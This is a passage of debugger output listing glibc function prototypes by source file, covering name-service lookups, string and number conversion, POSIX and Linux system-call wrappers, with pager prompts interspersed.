struct group *getgrnam(const char *);
struct hostent *gethostbyaddr(const void *, socklen_t, int);
struct hostent *gethostbyname(const char *);
struct hostent *gethostbyname2(const char *, int);
struct netent *getnetbyaddr(uint32_t, int);
struct netent *getnetbyname(const char *);
struct protoent *getprotobyname(const char *);
struct protoent *getprotobynumber(int);
struct passwd *getpwnam(const char *);
struct passwd *getpwuid(uid_t);
struct rpcent *getrpcbyname(const char *);
struct rpcent *getrpcbynumber(int);
struct servent *getservbyname(const char *, const char *);
struct servent *getservbyport(int, const char *);
struct sgrp *getsgnam(const char *);
struct spwd *getspnam(const char *);

File ../nss/getXXbyYY_r.c:
int __getaliasbyname_r(const char *, struct aliasent *, char *, size_t, struct aliasent **);
int __getgrgid_r(gid_t, struct group *, char *, size_t, struct group **);
int __getgrnam_r(const char *, struct group *, char *, size_t, struct group **);
int __gethostbyaddr_r(const void *, socklen_t, int, struct hostent *, char *, size_t, struct hostent **, int *);
---Type <return> to continue, or q <return> to quit---
int __gethostbyname2_r(const char *, int, struct hostent *, char *, size_t, struct hostent **, int *);
int __gethostbyname_r(const char *, struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetbyaddr_r(uint32_t, int, struct netent *, char *, size_t, struct netent **, int *);
int __getnetbyname_r(const char *, struct netent *, char *, size_t, struct netent **, int *);
int __getprotobyname_r(const char *, struct protoent *, char *, size_t, struct protoent **);
int __getprotobynumber_r(int, struct protoent *, char *, size_t, struct protoent **);
int __getpwnam_r(const char *, struct passwd *, char *, size_t, struct passwd **);
int __getpwuid_r(uid_t, struct passwd *, char *, size_t, struct passwd **);
int __getrpcbyname_r(const char *, struct rpcent *, char *, size_t, struct rpcent **);
int __getrpcbynumber_r(int, struct rpcent *, char *, size_t, struct rpcent **);
int __getservbyname_r(const char *, const char *, struct servent *, char *, size_t, struct servent **);
int __getservbyport_r(int, const char *, struct servent *, char *, size_t, struct servent **);
int __getsgnam_r(const char *, struct sgrp *, char *, size_t, struct sgrp **);
int __getspnam_r(const char *, struct spwd *, char *, size_t, struct spwd **);

File ../nss/getXXent.c:
struct aliasent *getaliasent(void);
struct group *getgrent(void);
struct hostent *gethostent(void);
struct netent *getnetent(void);
struct protoent *getprotoent(void);
struct passwd *getpwent(void);
struct rpcent *getrpcent(void);
struct servent *getservent(void);
struct sgrp *getsgent(void);
struct spwd *getspent(void);

File ../nss/getXXent_r.c:
int __getaliasent_r(struct aliasent *, char *, size_t, struct aliasent **);
int __getgrent_r(struct group *, char *, size_t, struct group **);
int __gethostent_r(struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetent_r(struct netent *, char *, size_t, struct netent **, int *);
int __getprotoent_r(struct protoent *, char *, size_t, struct protoent **);
int __getpwent_r(struct passwd *, char *, size_t, struct passwd **);
int __getrpcent_r(struct rpcent *, char *, size_t, struct rpcent **);
int __getservent_r(struct servent *, char *, size_t, struct servent **);
int __getsgent_r(struct sgrp *, char *, size_t, struct sgrp **);
int __getspent_r(struct spwd *, char *, size_t, struct spwd **);
void endaliasent(void);
void endgrent(void);
---Type <return> to continue, or q <return> to quit---
void endhostent(void);
void endnetent(void);
void endprotoent(void);
void endpwent(void);
void endrpcent(void);
void endservent(void);
void endsgent(void);
void endspent(void);
void setaliasent(void);
void setgrent(void);
void sethostent(int);
void setnetent(int);
void setprotoent(int);
void setpwent(void);
void setrpcent(int);
void setservent(int);
void setsgent(void);
void setspent(void);

File ../posix/glob.c:
int __GI_glob(const char *, int, int (*)(const char *, int), glob_t *);
void __GI_globfree(glob_t *);
int __glob_pattern_p(const char *, int);
int __glob_pattern_type(const char *, int);
static int collated_compare(const void *, const void *);
static int glob_in_dir(const char *, const char *, int, int (*)(const char *, int), glob_t *, size_t);
static int link_exists2_p(const char *, size_t, const char *, glob_t *);
static int prefix_array(const char *, char **, size_t);

File ../posix/sched_cpucount.c:
static int generic_cpucount(size_t, const cpu_set_t *);
static int popcount_cpucount(size_t, const cpu_set_t *);

File ../setjmp/longjmp.c:
void __longjmp_chk(struct __jmp_buf_tag *, int);

File ../signal/allocrtsig.c:
int __GI___libc_current_sigrtmax(void);
int __GI___libc_current_sigrtmin(void);
int __libc_allocate_rtsig(int);
---Type <return> to continue, or q <return> to quit---

File ../signal/sigfillset.c:
int __GI_sigfillset(sigset_t *);

File ../signal/sigreturn.c:
int __sigreturn(struct sigcontext *);

File ../socket/sa_len.c:
int __GI___libc_sa_len(sa_family_t);

File ../stdio-common/printf_fphex.c:
int __printf_fphex(_IO_FILE *, const struct printf_info *, const void * const *);

File ../stdlib/gmp.h:
mp_limb_t __mpn_add(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_add_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t __mpn_sub(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_sub_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);

File ../stdlib/labs.c:
long labs(long);

File ../stdlib/ldiv.c:
ldiv_t ldiv(long, long);

File ../stdlib/strtod.c:
double __GI___wcstod_internal(const wchar_t *, wchar_t **, int);
float __GI___wcstof_internal(const wchar_t *, wchar_t **, int);
long double __GI___wcstold_internal(const wchar_t *, wchar_t **, int);
double __GI_wcstod(const wchar_t *, wchar_t **);
float __GI_wcstof(const wchar_t *, wchar_t **);
long double __GI_wcstold(const wchar_t *, wchar_t **);

File ../stdlib/strtod_l.c:
long double __GI_____strtold_l_internal(const char *, char **, int, __locale_t);
long double __GI___strtold_l(const char *, char **, __locale_t);
double __GI___wcstod_l(const wchar_t *, wchar_t **, __locale_t);
float __GI___wcstof_l(const wchar_t *, wchar_t **, __locale_t);
long double __GI___wcstold_l(const wchar_t *, wchar_t **, __locale_t);
double ____wcstod_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
---Type <return> to continue, or q <return> to quit---
float ____wcstof_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
long double ____wcstold_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
static long double round_and_return(mp_limb_t *, intmax_t, int, mp_limb_t, mp_size_t, int);
static const char *str_to_mpn(const char *, int, mp_limb_t *, mp_size_t *, intmax_t *, size_t, const char *, const char *);

File ../stdlib/strtod_nan_main.c:
double __GI___wcstod_nan(const wchar_t *, wchar_t **, wchar_t);
float __GI___wcstof_nan(const wchar_t *, wchar_t **, wchar_t);
long double __GI___wcstold_nan(const wchar_t *, wchar_t **, wchar_t);

File ../stdlib/strtol.c:
long __GI___strtol_internal(const char *, char **, int, int);
unsigned long __GI___strtoul_internal(const char *, char **, int, int);
long __GI___wcstol_internal(const wchar_t *, wchar_t **, int, int);
unsigned long __GI___wcstoul_internal(const wchar_t *, wchar_t **, int, int);
long __strtol(const char *, char **, int);
unsigned long __strtoul(const char *, char **, int);
long __wcstol(const wchar_t *, wchar_t **, int);
unsigned long __wcstoul(const wchar_t *, wchar_t **, int);

File ../stdlib/strtol_l.c:
long __GI_____strtol_l_internal(const char *, char **, int, int, __locale_t);
unsigned long __GI_____strtoul_l_internal(const char *, char **, int, int, __locale_t);
long __GI___strtol_l(const char *, char **, int, __locale_t);
unsigned long __GI___strtoul_l(const char *, char **, int, __locale_t);
long __GI___wcstol_l(const wchar_t *, wchar_t **, int, __locale_t);
unsigned long __GI___wcstoul_l(const wchar_t *, wchar_t **, int, __locale_t);
long ____wcstol_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);
unsigned long ____wcstoul_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);

File ../string/bits/string2.h:
void *__mempcpy_small(void *, char, char, char, char, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__stpcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__strcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
size_t __strcspn_c1(const char *, int);
size_t __strcspn_c2(const char *, int, int);
size_t __strcspn_c3(const char *, int, int, int);
char *__strpbrk_c2(const char *, int, int);
char *__strpbrk_c3(const char *, int, int, int);
char *__strsep_1c(char **, char);
---Type <return> to continue, or q <return> to quit---
char *__strsep_2c(char **, char, char);
char *__strsep_3c(char **, char, char, char);
size_t __strspn_c1(const char *, int);
size_t __strspn_c2(const char *, int, int);
size_t __strspn_c3(const char *, int, int, int);
char *__strtok_r_1c(char *, char, char **);

File ../string/memmove.c:
void *__memmove_sse2(void *, const void *, size_t);
void *memmove(void *, const void *, size_t);

File ../string/str-two-way.h:
static char *two_way_long_needle(const unsigned char *, size_t, const unsigned char *, size_t);

File ../string/strcasecmp.c:
int __strcasecmp_l_nonascii(const char *, const char *, __locale_t);

File ../string/strcoll.c:
int __GI___wcscoll(const wchar_t *, const wchar_t *);

File ../string/strcoll_l.c:
int __GI___wcscoll_l(const wchar_t *, const wchar_t *, __locale_t);

File ../string/strncase.c:
int __strncasecmp_l_nonascii(const char *, const char *, size_t, __locale_t);

File ../string/strncat.c:
char *__strncat_sse2(char *, const char *, size_t);

File ../string/strstr.c:
char *__strstr_sse2(const char *, const char *);

File ../string/strxfrm.c:
size_t wcsxfrm(wchar_t *, const wchar_t *, size_t);

File ../string/strxfrm_l.c:
size_t __GI___wcsxfrm_l(wchar_t *, const wchar_t *, size_t, __locale_t);

File ../sysdeps/gnu/getutmp.c:
void getutmp(const struct utmpx *, struct utmp *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/gnu/unwind-resume.c:
void _Unwind_Resume(struct _Unwind_Exception *);
_Unwind_Reason_Code __gcc_personality_v0(int, _Unwind_Action, _Unwind_Exception_Class, struct _Unwind_Exception *, 
    struct _Unwind_Context *);
void __libgcc_s_init(void);

File ../sysdeps/i386/fpu/s_isinfl.c:
int __GI___isinfl(long double);

File ../sysdeps/i386/fpu/s_isnanl.c:
int __GI___isnanl(long double);

File ../sysdeps/ieee754/dbl-64/dbl2mpn.c:
mp_size_t __mpn_extract_double(mp_ptr, mp_size_t, int *, int *, double);

File ../sysdeps/ieee754/dbl-64/mpn2dbl.c:
double __mpn_construct_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_finite.c:
int __GI___finite(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_frexp.c:
double __frexp(double, int *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isinf.c:
int __GI___isinf(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isnan.c:
int __GI___isnan(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_modf.c:
double __modf(double, double *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_scalbn.c:
double __scalbn(double, int);

File ../sysdeps/ieee754/flt-32/mpn2flt.c:
float __mpn_construct_float(mp_srcptr, int, int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/ieee754/flt-32/s_finitef.c:
int __GI___finitef(float);

File ../sysdeps/ieee754/flt-32/s_frexpf.c:
float __frexpf(float, int *);

File ../sysdeps/ieee754/flt-32/s_isinff.c:
int __GI___isinff(float);

File ../sysdeps/ieee754/flt-32/s_isnanf.c:
int __GI___isnanf(float);

File ../sysdeps/ieee754/flt-32/s_modff.c:
float __modff(float, float *);

File ../sysdeps/ieee754/flt-32/s_scalbnf.c:
float __scalbnf(float, int);

File ../sysdeps/ieee754/ldbl-96/mpn2ldbl.c:
long double __mpn_construct_long_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/ldbl-96/s_frexpl.c:
long double __frexpl(long double, int *);

File ../sysdeps/ieee754/ldbl-96/s_modfl.c:
long double __modfl(long double, long double *);

File ../sysdeps/ieee754/ldbl-96/s_signbitl.c:
int __signbitl(long double);

File ../sysdeps/nptl/fork.c:
pid_t __libc_fork(void);

File ../sysdeps/nptl/jmp-unwind.c:
void _longjmp_unwind(struct __jmp_buf_tag *, int);

File ../sysdeps/posix/clock_getres.c:
int __clock_getres(clockid_t, struct timespec *);

File ../sysdeps/posix/closedir.c:
---Type <return> to continue, or q <return> to quit---
int __closedir(DIR *);

File ../sysdeps/posix/ctermid.c:
char *ctermid(char *);

File ../sysdeps/posix/cuserid.c:
char *cuserid(char *);

File ../sysdeps/posix/dirfd.c:
int dirfd(DIR *);

File ../sysdeps/posix/euidaccess.c:
int __euidaccess(const char *, int);

File ../sysdeps/posix/fdopendir.c:
DIR *__fdopendir(int);

File ../sysdeps/posix/gai_strerror.c:
const char *__GI_gai_strerror(int);

File ../sysdeps/posix/getaddrinfo.c:
void __GI_freeaddrinfo(struct addrinfo *);
int __GI_getaddrinfo(const char *, const char *, const struct addrinfo *, struct addrinfo **);
static _Bool convert_hostent_to_gaih_addrtuple(int, struct hostent *, struct gaih_addrtuple **, const struct addrinfo *);
static void fini(void);
static void gaiconf_init(void);
static int gaih_inet(const char *, const struct gaih_service *, const struct addrinfo *, struct addrinfo **, unsigned int *);
static int gaih_inet_serv(const char *, const struct gaih_typeproto *, struct gaih_servtuple *, const struct addrinfo *);
static int in6aicmp(const void *, const void *);
static int prefixcmp(const void *, const void *);
static int rfc3484_sort(const void *, const void *, void *);
static int scopecmp(const void *, const void *);

File ../sysdeps/posix/getdtsz.c:
int __getdtablesize(void);

File ../sysdeps/posix/gethostname.c:
int __gethostname(char *, size_t);

File ../sysdeps/posix/isatty.c:
---Type <return> to continue, or q <return> to quit---
int __isatty(int);

File ../sysdeps/posix/isfdtype.c:
int isfdtype(int, int);

File ../sysdeps/posix/killpg.c:
int killpg(__pid_t, int);

File ../sysdeps/posix/libc_fatal.c:
void __GI___libc_fatal(const char *);
void __libc_message(int, const char *, ...);

File ../sysdeps/posix/mkfifo.c:
int mkfifo(const char *, mode_t);

File ../sysdeps/posix/mkfifoat.c:
int mkfifoat(int, const char *, mode_t);

File ../sysdeps/posix/nice.c:
int nice(int);

File ../sysdeps/posix/opendir.c:
DIR *__alloc_dir(int, _Bool, int, const struct stat64 *);
DIR *__opendir(const char *);
DIR *__opendirat(int, const char *);

File ../sysdeps/posix/posix_fallocate.c:
static int internal_fallocate(int, __off_t, __off_t);

File ../sysdeps/posix/profil.c:
int __profil(u_short *, size_t, size_t, u_int);

File ../sysdeps/posix/readdir.c:
struct dirent *__readdir(DIR *);

File ../sysdeps/posix/readdir_r.c:
int __readdir_r(DIR *, struct dirent *, struct dirent **);

File ../sysdeps/posix/remove.c:
int __GI_remove(const char *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/posix/rewinddir.c:
void __GI___rewinddir(DIR *);
void __rewinddir(DIR *);

File ../sysdeps/posix/seekdir.c:
void seekdir(DIR *, long);

File ../sysdeps/posix/sigblock.c:
int __sigblock(int);

File ../sysdeps/posix/sigignore.c:
int sigignore(int);

File ../sysdeps/posix/sigintr.c:
int siginterrupt(int, int);

File ../sysdeps/posix/signal.c:
__sighandler_t __bsd_signal(int, __sighandler_t);

File ../sysdeps/posix/sigpause.c:
int __GI___sigpause(int, int);
int __default_sigpause(int);
int __xpg_sigpause(int);

File ../sysdeps/posix/sigset.c:
__sighandler_t sigset(int, __sighandler_t);

File ../sysdeps/posix/sigsetmask.c:
int __sigsetmask(int);

File ../sysdeps/posix/sleep.c:
unsigned int __sleep(unsigned int);

File ../sysdeps/posix/spawni.c:
int __spawni(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char * const *, char * const *, 
    int);

File ../sysdeps/posix/sprofil.c:
int __sprofil(struct prof *, int, struct timeval *, unsigned int);
---Type <return> to continue, or q <return> to quit---
static int insert(int, unsigned long, unsigned long, struct prof *, int);
static int pcmp(const void *, const void *);

File ../sysdeps/posix/sysconf.c:
static long __sysconf_check_spec(const char *);

File ../sysdeps/posix/system.c:
int __libc_system(const char *);
static int do_system(const char *);

File ../sysdeps/posix/sysv_signal.c:
__sighandler_t __sysv_signal(int, __sighandler_t);

File ../sysdeps/posix/telldir.c:
long telldir(DIR *);

File ../sysdeps/posix/tempname.c:
int __gen_tempname(char *, int, int, int);
int __path_search(char *, size_t, const char *, const char *, int);

File ../sysdeps/posix/ulimit.c:
long __ulimit(int, ...);

File ../sysdeps/posix/usleep.c:
int usleep(useconds_t);

File ../sysdeps/pthread/flockfile.c:
void __flockfile(FILE *);

File ../sysdeps/pthread/ftrylockfile.c:
int __ftrylockfile(FILE *);

File ../sysdeps/pthread/funlockfile.c:
void __funlockfile(FILE *);

File ../sysdeps/unix/bsd/ftime.c:
int ftime(struct timeb *);

File ../sysdeps/unix/bsd/getpt.c:
int __bsd_getpt(void);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/bsd/tcgetpgrp.c:
pid_t __GI_tcgetpgrp(int);

File ../sysdeps/unix/bsd/tcsetpgrp.c:
int tcsetpgrp(int, pid_t);

File ../sysdeps/unix/bsd/ualarm.c:
useconds_t ualarm(useconds_t, useconds_t);

File ../sysdeps/unix/bsd/wait3.c:
pid_t __wait3(__WAIT_STATUS, int, struct rusage *);

File ../sysdeps/unix/clock_gettime.c:
int __GI___clock_gettime(clockid_t, struct timespec *);

File ../sysdeps/unix/clock_settime.c:
int __clock_settime(clockid_t, const struct timespec *);

File ../sysdeps/unix/get_child_max.c:
long __get_child_max(void);

File ../sysdeps/unix/getlogin.c:
static char *getlogin_fd0(void);

File ../sysdeps/unix/getlogin_r.c:
static int getlogin_r_fd0(char *, size_t);

File ../sysdeps/unix/grantpt.c:
int grantpt(int);

File ../sysdeps/unix/sockatmark.c:
int sockatmark(int);

File ../sysdeps/unix/stime.c:
int stime(const time_t *);

File ../sysdeps/unix/sysv/linux/_exit.c:
void __GI__exit(int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/accept4.c:
int accept4(int, __SOCKADDR_ARG, socklen_t *, int);

File ../sysdeps/unix/sysv/linux/adjtime.c:
int __adjtime(const struct timeval *, struct timeval *);

File ../sysdeps/unix/sysv/linux/bits/sigset.h:
int __sigaddset(__sigset_t *, int);
int __sigdelset(__sigset_t *, int);
int __sigismember(const __sigset_t *, int);

File ../sysdeps/unix/sysv/linux/check_native.c:
void __check_native(uint32_t, int *, uint32_t, int *);

File ../sysdeps/unix/sysv/linux/check_pf.c:
void __check_pf(_Bool *, _Bool *, struct in6addrinfo **, size_t *);
void __free_in6ai(struct in6addrinfo *);
static void freecache(void);

File ../sysdeps/unix/sysv/linux/clock.c:
clock_t clock(void);

File ../sysdeps/unix/sysv/linux/clock_getcpuclockid.c:
int __clock_getcpuclockid(pid_t, clockid_t *);

File ../sysdeps/unix/sysv/linux/clock_nanosleep.c:
int __clock_nanosleep(clockid_t, int, const struct timespec *, struct timespec *);

File ../sysdeps/unix/sysv/linux/cmsg_nxthdr.c:
struct cmsghdr *__cmsg_nxthdr(struct msghdr *, struct cmsghdr *);

File ../sysdeps/unix/sysv/linux/dl-execstack.c:
int __GI__dl_make_stack_executable(void **);

File ../sysdeps/unix/sysv/linux/dl-openat64.c:
int openat64(int, const char *, int, ...);

File ../sysdeps/unix/sysv/linux/dl-origin.c:
const char *_dl_get_origin(void);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/dl-sysdep.c:
int _dl_discover_osversion(void);

File ../sysdeps/unix/sysv/linux/dl-vdso.c:
void *_dl_vdso_vsym(const char *, const struct r_found_version *);

File ../sysdeps/unix/sysv/linux/epoll_pwait.c:
int __GI_epoll_pwait(int, struct epoll_event *, int, int, const sigset_t *);

File ../sysdeps/unix/sysv/linux/eventfd.c:
int eventfd(unsigned int, int);

File ../sysdeps/unix/sysv/linux/eventfd_read.c:
int eventfd_read(int, eventfd_t *);

File ../sysdeps/unix/sysv/linux/eventfd_write.c:
int eventfd_write(int, eventfd_t);

File ../sysdeps/unix/sysv/linux/faccessat.c:
int faccessat(int, const char *, int, int);

File ../sysdeps/unix/sysv/linux/fchmodat.c:
int fchmodat(int, const char *, mode_t, int);

File ../sysdeps/unix/sysv/linux/fcntl.c:
int __GI___libc_fcntl(int, int, ...);
int __fcntl_nocancel(int, int, ...);
int __libc_fcntl(int, int, ...);

File ../sysdeps/unix/sysv/linux/fexecve.c:
int fexecve(int, char * const *, char * const *);

File ../sysdeps/unix/sysv/linux/fpathconf.c:
long __fpathconf(int, int);

File ../sysdeps/unix/sysv/linux/futimens.c:
int futimens(int, const struct timespec *);

File ../sysdeps/unix/sysv/linux/futimes.c:
int __futimes(int, const struct timeval *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/sysv/linux/futimesat.c:
int futimesat(int, const char *, const struct timeval *);

File ../sysdeps/unix/sysv/linux/gai_sigqueue.c:
int __gai_sigqueue(int, const union sigval, pid_t);

File ../sysdeps/unix/sysv/linux/getclktck.c:
int __getclktck(void);

File ../sysdeps/unix/sysv/linux/getcwd.c:
char *__getcwd(char *, size_t);

File ../sysdeps/unix/sysv/linux/getdents.c:
ssize_t __getdents(int, char *, size_t);

File ../sysdeps/unix/sysv/linux/gethostid.c:
long gethostid(void);
int sethostid(long);

File ../sysdeps/unix/sysv/linux/getipv4sourcefilter.c:
int getipv4sourcefilter(int, struct in_addr, struct in_addr, uint32_t *, uint32_t *, struct in_addr *);

File ../sysdeps/unix/sysv/linux/getloadavg.c:
int getloadavg(double *, int);

File ../sysdeps/unix/sysv/linux/getlogin.c:
char *getlogin(void);

File ../sysdeps/unix/sysv/linux/getlogin_r.c:
int __GI___getlogin_r(char *, size_t);
int __getlogin_r_loginuid(char *, size_t);

File ../sysdeps/unix/sysv/linux/getpagesize.c:
int __GI___getpagesize(void);

File ../sysdeps/unix/sysv/linux/getpid.c:
pid_t __GI___getpid(void);
pid_t __getpid(void);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/getpriority.c:
int __GI___getpriority(enum __priority_which, id_t);

File ../sysdeps/unix/sysv/linux/getpt.c:
int __getpt(void);
int __posix_openpt(int);

File ../sysdeps/unix/sysv/linux/getsourcefilter.c:
int __get_sol(int, socklen_t);
int getsourcefilter(int, uint32_t, const struct sockaddr *, socklen_t, uint32_t *, uint32_t *, struct sockaddr_storage *);

File ../sysdeps/unix/sysv/linux/getsysstats.c:
long __get_avphys_pages(void);
int __get_nprocs(void);
int __get_nprocs_conf(void);
long __get_phys_pages(void);
static char *next_line(int, char * const, char **, char **, char * const);

File ../sysdeps/unix/sysv/linux/if_index.c:
void __GI___if_freenameindex(struct if_nameindex *);
unsigned int __GI___if_nametoindex(const char *);
char *__if_indextoname(unsigned int, char *);
struct if_nameindex *__if_nameindex(void);

File ../sysdeps/unix/sysv/linux/ifaddrs.c:
void __freeifaddrs(struct ifaddrs *);
int __getifaddrs(struct ifaddrs **);
void __netlink_close(struct netlink_handle *);
void __netlink_free_handle(struct netlink_handle *);
int __netlink_open(struct netlink_handle *);
int __netlink_request(struct netlink_handle *, int);
static int getifaddrs_internal(struct ifaddrs **);

File ../sysdeps/unix/sysv/linux/ifreq.c:
void __ifreq(struct ifreq **, int *, int);

File ../sysdeps/unix/sysv/linux/internal_statvfs.c:
void __internal_statvfs(const char *, struct statvfs *, struct statfs *, int);
int __statvfs_getflags(const char *, int, int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/libc_fatal.c:
static void backtrace_and_maps(int, _Bool, int);

File ../sysdeps/unix/sysv/linux/lutimes.c:
int lutimes(const char *, const struct timeval *);

File ../sysdeps/unix/sysv/linux/makedev.c:
unsigned int gnu_dev_major(unsigned long long);
unsigned long long gnu_dev_makedev(unsigned int, unsigned int);
unsigned int gnu_dev_minor(unsigned long long);

File ../sysdeps/unix/sysv/linux/netlink_assert_response.c:
void __GI___netlink_assert_response(int, ssize_t);

File ../sysdeps/unix/sysv/linux/ntp_gettime.c:
int ntp_gettime(struct ntptimeval *);

File ../sysdeps/unix/sysv/linux/ntp_gettimex.c:
int ntp_gettimex(struct ntptimeval *);

File ../sysdeps/unix/sysv/linux/opensock.c:
int __opensock(void);

File ../sysdeps/unix/sysv/linux/pathconf.c:
long __pathconf(const char *, int);
long __statfs_chown_restricted(int, const struct statfs *);
long __statfs_filesize_max(int, const struct statfs *);
long __statfs_link_max(int, const struct statfs *, const char *, int);
long __statfs_symlinks(int, const struct statfs *);
static long distinguish_extX(const char *, int, const struct statfs *);

File ../sysdeps/unix/sysv/linux/posix_madvise.c:
int posix_madvise(void *, size_t, int);

File ../sysdeps/unix/sysv/linux/ppoll.c:
int __GI_ppoll(struct pollfd *, nfds_t, const struct timespec *, const sigset_t *);

File ../sysdeps/unix/sysv/linux/prof-freq.c:
int __GI___profile_frequency(void);
int __profile_frequency(void);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/sysv/linux/pselect.c:
int __pselect(int, fd_set *, fd_set *, fd_set *, const struct timespec *, const sigset_t *);

File ../sysdeps/unix/sysv/linux/ptrace.c:
long ptrace(enum __ptrace_request, ...);

File ../sysdeps/unix/sysv/linux/ptsname.c:
int __ptsname_internal(int, char *, size_t, struct stat64 *);
int __ptsname_r(int, char *, size_t);
char *ptsname(int);

File ../sysdeps/unix/sysv/linux/raise.c:
int __GI_raise(int);

File ../sysdeps/unix/sysv/linux/readonly-area.c:
int __readonly_area(const char *, size_t);

File ../sysdeps/unix/sysv/linux/reboot.c:
int reboot(int);

File ../sysdeps/unix/sysv/linux/recvmmsg.c:
int recvmmsg(int, struct mmsghdr *, unsigned int, int, struct timespec *);

File ../sysdeps/unix/sysv/linux/sched_getaffinity.c:
int __GI___sched_getaffinity_new(pid_t, size_t, cpu_set_t *);
int __sched_getaffinity_old(pid_t, cpu_set_t *);

File ../sysdeps/unix/sysv/linux/sched_getcpu.c:
int sched_getcpu(void);

File ../sysdeps/unix/sysv/linux/sendmmsg.c:
int __GI___sendmmsg(int, struct mmsghdr *, unsigned int, int);

File ../sysdeps/unix/sysv/linux/setegid.c:
int __GI_setegid(gid_t);

File ../sysdeps/unix/sysv/linux/seteuid.c:
int __GI_seteuid(uid_t);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/unix/sysv/linux/setgid.c:
int __setgid(gid_t);

File ../sysdeps/unix/sysv/linux/setgroups.c:
int __GI_setgroups(size_t, const gid_t *);

File ../sysdeps/unix/sysv/linux/setipv4sourcefilter.c:
int setipv4sourcefilter(int, struct in_addr, struct in_addr, uint32_t, uint32_t, const struct in_addr *);

File ../sysdeps/unix/sysv/linux/setregid.c:
int __setregid(gid_t, gid_t);

File ../sysdeps/unix/sysv/linux/setresgid.c:
int __GI___setresgid(gid_t, gid_t, gid_t);

File ../sysdeps/unix/sysv/linux/setresuid.c:
int __GI___setresuid(uid_t, uid_t, uid_t);

File ../sysdeps/unix/sysv/linux/setreuid.c:
int __setreuid(uid_t, uid_t);

File ../sysdeps/unix/sysv/linux/setsourcefilter.c:
int setsourcefilter(int, uint32_t, const struct sockaddr *, socklen_t, uint32_t, uint32_t, const struct sockaddr_storage *);

File ../sysdeps/unix/sysv/linux/setuid.c:
int __setuid(uid_t);

File ../sysdeps/unix/sysv/linux/signalfd.c:
int signalfd(int, const sigset_t *, int);

File ../sysdeps/unix/sysv/linux/sigqueue.c:
int __sigqueue(pid_t, int, const union sigval);

File ../sysdeps/unix/sysv/linux/sigstack.c:
int sigstack(struct sigstack *, struct sigstack *);

File ../sysdeps/unix/sysv/linux/sigsuspend.c:
int __GI___sigsuspend(const sigset_t *);

File ../sysdeps/unix/sysv/linux/sigtimedwait.c:
---Type <return> to continue, or q <return> to quit---
int __GI___sigtimedwait(const sigset_t *, siginfo_t *, const struct timespec *);

File ../sysdeps/unix/sysv/linux/sigwait.c:
int __GI___sigwait(const sigset_t *, int *);

File ../sysdeps/unix/sysv/linux/sigwaitinfo.c:
int __GI___sigwaitinfo(const sigset_t *, siginfo_t *);

File ../sysdeps/unix/sysv/linux/speed.c:
int __GI_cfsetispeed(struct termios *, speed_t);
int __GI_cfsetospeed(struct termios *, speed_t);
speed_t cfgetispeed(const struct termios *);
speed_t cfgetospeed(const struct termios *);

File ../sysdeps/unix/sysv/linux/sysctl.c:
int __GI___sysctl(int *, int, void *, size_t *, void *, size_t);

File ../sysdeps/unix/sysv/linux/system.c:
static void cancel_handler(void *);

File ../sysdeps/unix/sysv/linux/tcdrain.c:
int __libc_tcdrain(int);

File ../sysdeps/unix/sysv/linux/tcflow.c:
int tcflow(int, int);

File ../sysdeps/unix/sysv/linux/tcflush.c:
int tcflush(int, int);

File ../sysdeps/unix/sysv/linux/tcgetattr.c:
int __tcgetattr(int, struct termios *);

File ../sysdeps/unix/sysv/linux/tcsendbrk.c:
int tcsendbreak(int, int);

File ../sysdeps/unix/sysv/linux/tcsetattr.c:
int __GI_tcsetattr(int, int, const struct termios *);

File ../sysdeps/unix/sysv/linux/times.c:
clock_t __times(struct tms *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/unix/sysv/linux/timespec_get.c:
int timespec_get(struct timespec *, int);

File ../sysdeps/unix/sysv/linux/ttyname.c:
char *ttyname(int);
static char *getttyname(const char *, dev_t, ino64_t, int, int *);

File ../sysdeps/unix/sysv/linux/ttyname_r.c:
int __ttyname_r(int, char *, size_t);
static int getttyname_r(char *, size_t, dev_t, ino64_t, int, int *);

File ../sysdeps/unix/sysv/linux/unlockpt.c:
int unlockpt(int);

File ../sysdeps/unix/sysv/linux/ustat.c:
int ustat(dev_t, struct ustat *);

File ../sysdeps/unix/sysv/linux/utimensat.c:
int utimensat(int, const char *, const struct timespec *, int);

File ../sysdeps/unix/sysv/linux/utimes.c:
int __utimes(const char *, const struct timeval *);

File ../sysdeps/unix/sysv/linux/wait.c:
pid_t __libc_wait(int *);

File ../sysdeps/unix/sysv/linux/waitid.c:
int __waitid(idtype_t, id_t, siginfo_t *, int);

File ../sysdeps/unix/sysv/linux/waitpid.c:
